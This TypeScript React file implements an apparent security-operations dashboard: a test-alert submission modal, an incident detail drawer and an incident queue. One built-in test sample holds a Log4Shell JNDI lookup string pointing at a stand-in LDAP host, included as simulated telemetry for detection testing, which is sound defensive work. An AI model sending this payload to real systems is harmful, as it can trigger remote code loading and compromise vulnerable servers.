import { useMemo, useState } from 'react';
import { Alert, App, Button, Descriptions, Drawer, Dropdown, Input, Modal, Select, Space, Table, Tag, Timeline } from 'antd';
import { ArrowRightOutlined, CheckCircleOutlined, CheckOutlined, DesktopOutlined, DownloadOutlined, MoreOutlined, ReloadOutlined, SearchOutlined } from '@ant-design/icons';
import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';
import { Link, useNavigate, useParams, useSearchParams } from 'react-router-dom';
import { api, body, download } from '../api';
import { useSession } from '../context';
import { Code, date, EmptyPanel, ErrorPanel, Loading, PageTitle, Severity, Stat, Status } from '../components';
import type { Incident } from '../types';

const samples = {
  ssh: { name: 'SSH authentication failures', level: 8, description: 'Repeated SSH authentication failures on a monitored host', mitre: 'T1110', log: 'sshd: Failed password for invalid user admin from 192.0.2.10 port 43122 ssh2' },
  log4j: { name: 'Log4Shell lookup attempt', level: 12, description: 'Log4j JNDI lookup pattern detected in application request', mitre: 'T1190', log: 'GET /search?q=${jndi:ldap://example.invalid/test} HTTP/1.1' },
  ransomware: { name: 'Suspicious file encryption', level: 13, description: 'Potential ransomware: rapid file encryption activity', mitre: 'T1486', log: 'File monitor: 250 files renamed to .locked within a 10-second window' },
};

export function IngestModal({ open, close }: { open: boolean; close: () => void }) {
  const { orgId } = useSession(); const query = useQueryClient(); const { message } = App.useApp();
  const [sample, setSample] = useState<keyof typeof samples>('ssh'); const [custom, setCustom] = useState('');
  function payload() { const s = samples[sample]; return { id: `console-${crypto.randomUUID()}`, rule: { id: 100001, level: s.level, description: s.description, mitre: { id: s.mitre } }, agent: { id: 'console-test', name: 'Training endpoint' }, full_log: s.log, timestamp: new Date().toISOString() }; }
  const mutation = useMutation({ mutationFn: async () => {
    let value: unknown; try { value = custom ? JSON.parse(custom) : payload(); } catch { throw new Error('The payload must be valid JSON.'); }
    return api('/wazuh', orgId, body('POST', value));
  }, onSuccess: () => { query.invalidateQueries({ queryKey: ['incidents', orgId] }); message.success('Alert investigated'); close(); setCustom(''); } });
  return <Modal title="Submit a test alert" open={open} onCancel={close} okText="Submit alert" onOk={() => mutation.mutate()} confirmLoading={mutation.isPending} width={660} destroyOnHidden>
    <p className="muted">Creates real investigation data in this organization using your configured pipeline. Configured notification channels may receive this alert.</p>
    <Select aria-label="Test scenario" className="full-width" value={sample} options={Object.entries(samples).map(([value, item]) => ({ value, label: item.name }))} onChange={value => { setSample(value); setCustom(''); mutation.reset(); }} />
    <label className="field-label">Alert payload <span>Optional JSON override</span></label><Input.TextArea aria-label="Alert JSON" rows={9} className="mono" value={custom} placeholder={JSON.stringify(payload(), null, 2)} onChange={e => setCustom(e.target.value)} />
    {mutation.error && <Alert type="error" showIcon title={mutation.error.message} className="form-alert" />}
  </Modal>;
}

function IncidentDetail({ id, close }: { id: string; close: () => void }) {
  const { orgId, detail, system } = useSession(); const query = useQueryClient(); const { message } = App.useApp();
  const incident = useQuery({ queryKey: ['incident', orgId, id], queryFn: () => api<Incident>(`/incidents/${encodeURIComponent(id)}`, orgId), refetchInterval: 5000 });
  const action = useMutation({ mutationFn: (action_type: string) => api(`/incidents/${encodeURIComponent(id)}/action`, orgId, body('POST', { action_type })), onSuccess: () => { query.invalidateQueries({ queryKey: ['incidents', orgId] }); query.invalidateQueries({ queryKey: ['incident', orgId, id] }); message.success('Incident status updated'); }, onError: error => message.error(error.message) });
  const t = incident.data; const canWrite = detail?.role === 'admin' || detail?.role === 'member';
  return <Drawer title={<span className="mono">{id}</span>} size={700} open onClose={close} extra={t && <Button icon={<DownloadOutlined />} onClick={() => download(`${t.id}.json`, JSON.stringify(t, null, 2))}>Export</Button>}>
    {incident.isPending ? <Loading /> : incident.error ? <ErrorPanel error={incident.error} retry={() => void incident.refetch()} /> : t && <div className="detail-stack">
      <Space><Severity value={t.severity} /><Status value={t.status} /></Space><h2 className="detail-title">{t.rule_description || 'Security incident'}</h2>
      <Descriptions size="small" column={2} items={[{ key: 'host', label: 'Host', children: t.agent_name }, { key: 'time', label: 'Received', children: date(t.created_at) }, { key: 'event-time', label: 'Event time', children: date(t.timestamp) }, { key: 'policy', label: 'Policy', children: t.policy_tier }, { key: 'confidence', label: 'Confidence', children: t.confidence }, { key: 'source', label: 'Assessment', children: system?.llm_model || 'TERMINUS AI Engine' }]} />
      {t.external_export_status && <Alert type={t.external_export_status === 'failed' ? 'warning' : 'info'} showIcon title={t.external_export_status === 'failed' ? 'Jira export failed; local evidence retained' : `Exported to Jira: ${t.external_ticket_id}`} />}
      <section className="detail-section"><div className="eyebrow">INVESTIGATION SUMMARY</div><p>{t.summary}</p><p className="muted">{t.policy_reason}</p></section>
      <section className="detail-section"><div className="eyebrow">RECOMMENDED NEXT STEPS</div><ol className="recommendations">{t.recommended_actions.map((item, i) => <li key={i}>{item}</li>)}</ol><Alert type="info" showIcon title="Analyst Action Required" description="Review the evidence before taking action in your response tools. TERMINUS does not execute remediation." /></section>
      <Space wrap><Button type="primary" icon={<CheckOutlined />} loading={action.isPending} disabled={!canWrite} onClick={() => action.mutate(t.status === 'RESOLVED' ? 'reopen_ticket' : 'close_ticket')}>{t.status === 'RESOLVED' ? 'Reopen incident' : 'Resolve incident'}</Button>{t.status === 'OPEN' && <Button disabled={!canWrite} loading={action.isPending} onClick={() => action.mutate('start_investigation')}>Mark investigating</Button>}</Space>
      <section className="detail-section"><div className="eyebrow">LIFECYCLE</div><Timeline items={[{ content: <><strong>Incident created</strong><p className="muted">{date(t.created_at)}</p></> }, ...(t.updated_at ? [{ color: 'green', content: <><strong>Status: {t.status.toLowerCase()}</strong><p className="muted">{date(t.updated_at)}</p></> }] : [])]} /></section>
      <section className="detail-section"><div className="eyebrow">RAW TELEMETRY</div><Code>{t.full_log || 'No raw log attached to this alert.'}</Code>{t.context_notes && <p className="muted">{t.context_notes}</p>}</section>
    </div>}
  </Drawer>;
}

export default function Operations({ incidentView = false }: { incidentView?: boolean }) {
  const { orgId } = useSession(); const navigate = useNavigate();
  const { ticketId } = useParams(); const [params, setParams] = useSearchParams();
  const incidents = useQuery({ queryKey: ['incidents', orgId], queryFn: () => api<Incident[]>('/incidents', orgId), refetchInterval: 5000 });
  const data = useMemo(() => [...(incidents.data || [])].sort((a, b) => (b.created_at || b.timestamp).localeCompare(a.created_at || a.timestamp)), [incidents.data]);
  const open = data.filter(t => t.status !== 'RESOLVED'); const critical = open.filter(t => t.severity === 'critical');
  const search = params.get('q') || ''; const severity = params.get('severity') || 'all'; const status = params.get('status') || 'all';
  const filtered = data.filter(t => `${t.id} ${t.rule_description} ${t.agent_name} ${t.summary}`.toLowerCase().includes(search.toLowerCase()) && (severity === 'all' || t.severity === severity) && (status === 'all' || t.status === status));
  const counts = ['critical', 'high', 'medium', 'low'].map(name => ({ name, count: data.filter(t => t.severity === name).length }));
  const impactedHosts = useMemo(() => {
    const map = new Map<string, { count: number; maxSeverity: string; latestTime: string }>();
    const severityRank: Record<string, number> = { critical: 4, high: 3, medium: 2, low: 1 };
    for (const inc of data) {
      const host = inc.agent_name || 'unassigned-host';
      const entry = map.get(host);
      if (!entry) {
        map.set(host, { count: 1, maxSeverity: inc.severity, latestTime: inc.created_at || inc.timestamp });
      } else {
        entry.count += 1;
        if ((severityRank[inc.severity] || 0) > (severityRank[entry.maxSeverity] || 0)) {
          entry.maxSeverity = inc.severity;
        }
        if ((inc.created_at || inc.timestamp) > entry.latestTime) {
          entry.latestTime = inc.created_at || inc.timestamp;
        }
      }
    }
    return Array.from(map.entries())
      .map(([host, info]) => ({ host, ...info }))
      .sort((a, b) => (severityRank[b.maxSeverity] || 0) - (severityRank[a.maxSeverity] || 0) || b.count - a.count);
  }, [data]);
  function filter(key: string, value: string) { const next = new URLSearchParams(params); if (value && value !== 'all') next.set(key, value); else next.delete(key); setParams(next, { replace: true }); }
  const columns = [
    { title: 'INCIDENT', dataIndex: 'rule_description', key: 'incident', render: (_: string, t: Incident) => <Link className="incident-link" to={`/incidents/${t.id}`}><strong>{t.rule_description || 'Security incident'}</strong><small className="mono">{t.id}</small></Link> },
    { title: 'SEVERITY', dataIndex: 'severity', key: 'severity', width: 110, render: (value: string) => <Severity value={value} /> },
    { title: 'HOST', dataIndex: 'agent_name', key: 'host', ellipsis: true, width: 160 },
    { title: 'STATUS', dataIndex: 'status', key: 'status', width: 130, render: (value: string) => <Status value={value} /> },
    { title: 'RECEIVED', dataIndex: 'created_at', key: 'created', width: 140, sorter: (a: Incident, b: Incident) => a.created_at.localeCompare(b.created_at), render: (value: string) => <span className="muted">{date(value)}</span> },
    { title: '', key: 'action', width: 44, render: (_: unknown, t: Incident) => <Dropdown menu={{ items: [{ key: 'open', label: 'View incident', onClick: () => navigate(`/incidents/${t.id}`) }, { key: 'export', label: 'Export JSON', onClick: () => download(`${t.id}.json`, JSON.stringify(t, null, 2)) }] }}><Button type="text" aria-label={`Actions for ${t.id}`} icon={<MoreOutlined />} /></Dropdown> },
  ];
  return <><PageTitle eyebrow={incidentView ? 'INVESTIGATE' : 'OPERATIONS / OVERVIEW'} title={incidentView ? 'Incident queue' : 'Your security, in focus.'} description={incidentView ? 'Review the evidence. Prioritize what needs your attention.' : 'A clear view of incoming threats and the work ahead.'} actions={<Space><Button type="primary" icon={<ReloadOutlined spin={incidents.isFetching} />} onClick={() => void incidents.refetch()}>Refresh</Button></Space>} />
    <ErrorPanel error={incidents.error} retry={() => void incidents.refetch()} />
    {!incidentView && <><div className="stats-grid"><Stat label="OPEN INCIDENTS" value={incidents.isPending ? '—' : open.length.toString().padStart(2, '0')} note="Awaiting investigation or resolution" /><Stat label="CRITICAL PRIORITY" value={incidents.isPending ? '—' : critical.length.toString().padStart(2, '0')} note="Unresolved critical assessments" accent="critical" /><Stat label="RESOLVED" value={incidents.isPending ? '—' : data.length - open.length} note="Marked resolved by your team" /><Stat label="TOTAL INVESTIGATED" value={incidents.isPending ? '—' : data.length} note="Incidents in this organization" /></div>
    <div className="overview-grid"><section className="panel signal-panel"><div className="panel-heading"><div><span className="eyebrow">THREAT DISTRIBUTION</span><h2>Severity Breakdown</h2></div><Tag bordered={false}>ALL STORED INCIDENTS</Tag></div><div className="distribution-bar">{data.length ? counts.filter(c => c.count).map(c => <div key={c.name} className={`segment ${c.name}`} style={{ flex: c.count }} title={`${c.name}: ${c.count}`} />) : <div className="segment no-data" />}</div><div className="distribution-legend">{counts.map(c => <div key={c.name}><i className={`legend-dot ${c.name}`} /><span>{c.name}</span><strong>{c.count}</strong></div>)}</div><div className="panel-bottom">{data.length ? `${data.length} incident assessments · ${open.length} open` : 'Awaiting incoming telemetry streams from monitored endpoints.'}</div></section>
    <section className="panel pipeline-panel"><div className="panel-heading"><div><span className="eyebrow">IMPACTED ASSETS</span><h2>Hosts in incident records</h2></div><Tag bordered={false}>{impactedHosts.length} HOSTS</Tag></div>
    {impactedHosts.length ? <div className="endpoint-list">{impactedHosts.slice(0, 3).map(item => <div key={item.host} className="pipeline-step"><span style={{ fontSize: 13 }}><DesktopOutlined /></span><div><Link to={`/incidents?q=${encodeURIComponent(item.host)}`}><strong>{item.host}</strong></Link><small>{item.count} {item.count === 1 ? 'incident' : 'incidents'} · Last incident {date(item.latestTime)}</small></div><Severity value={item.maxSeverity} /></div>)}</div> : <div style={{ padding: '24px 0', textAlign: 'center' }}><CheckCircleOutlined style={{ fontSize: 24, color: '#a4dfba', marginBottom: 8, display: 'block' }} /><strong style={{ display: 'block', fontSize: 13 }}>No host evidence yet</strong><small className="muted">Host health cannot be inferred from an empty incident queue.</small></div>}
    <div className="panel-bottom">{impactedHosts.length ? `${impactedHosts.length} host${impactedHosts.length > 1 ? 's' : ''} represented in stored incidents` : 'Connect a source to start collecting incident evidence.'}</div>
    </section></div></>}
    <section className="panel table-panel"><div className="panel-heading"><div><span className="eyebrow">{incidentView ? 'ALL INCIDENTS' : 'RECENT ACTIVITY'}</span><h2>{incidentView ? 'Investigation workspace' : 'Latest incidents'}</h2></div>{!incidentView && <Link to="/incidents">View all <ArrowRightOutlined /></Link>}</div>
      {incidentView && <div className="table-toolbar"><Input aria-label="Search incidents" prefix={<SearchOutlined />} placeholder="Search incident, host or evidence…" value={search} onChange={e => filter('q', e.target.value)} allowClear /><Select aria-label="Filter severity" value={severity} onChange={value => filter('severity', value)} options={[{ value: 'all', label: 'All severities' }, ...counts.map(c => ({ value: c.name, label: c.name[0].toUpperCase() + c.name.slice(1) }))]} /><Select aria-label="Filter status" value={status} onChange={value => filter('status', value)} options={[{ value: 'all', label: 'All statuses' }, ...['OPEN', 'INVESTIGATING', 'RESOLVED'].map(value => ({ value, label: value }))]} /></div>}
      <Table<Incident> rowKey="id" columns={columns} dataSource={incidentView ? filtered : data.slice(0, 5)} loading={incidents.isPending} pagination={incidentView ? { pageSize: 10, showSizeChanger: false, showTotal: total => `${total} incidents` } : false} locale={{ emptyText: <EmptyPanel title={data.length ? 'No matching incidents' : 'No active incidents'} description={data.length ? 'Try adjusting your filters.' : 'Incoming incidents will appear here. An empty queue does not establish endpoint health.'} /> }} />
      <div className="table-foot"><span><i className={`status-dot ${incidents.error ? 'error' : ''}`} />{incidents.error ? 'Updates unavailable' : 'Refreshes every 5 seconds'}</span><span>{incidents.dataUpdatedAt ? `Updated ${new Date(incidents.dataUpdatedAt).toLocaleTimeString()}` : 'Waiting for data'}</span></div>
    </section>{ticketId && <IncidentDetail key={`${orgId}-${ticketId}`} id={ticketId} close={() => navigate('/incidents' + (params.size ? `?${params}` : ''))} />}
  </>;
}
